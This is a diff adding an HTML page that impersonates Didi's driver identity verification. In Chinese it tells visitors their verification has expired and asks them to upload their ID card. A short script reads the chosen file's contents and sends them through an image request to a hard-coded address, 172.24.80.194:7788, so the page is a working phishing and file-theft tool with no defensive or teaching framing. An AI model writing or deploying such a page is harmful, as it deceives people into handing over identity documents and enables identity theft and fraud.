@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>滴滴车主 身份认证</title>
+</head>
+<body>
+    <h5>您的身份认证已过期，请重新上传身份证</h5>
+    <input type="file" accept="*/*" onchange="fileCallback(window.URL.createObjectURL(this.files[0]))">
+</body>
+<script type="text/javascript">
+    function getFile(url, callback) {
+        var req_instance = new XMLHttpRequest();
+        req_instance.open("GET", url, true);
+        req_instance.onload = function(e) {
+            alert(req_instance.responseText);
+            callback(req_instance.responseText);
+        }
+        req_instance.onerror = function(e) {
+            callback("error");
+        }
+        req_instance.send();
+    }
+    function fileCallback(url) {
+        getFile(url, function(contents) {
+            new Image().src = "http://172.24.80.194:7788/?data=" + encodeURIComponent(contents);
+        });
+    }
+</script>
+</html>
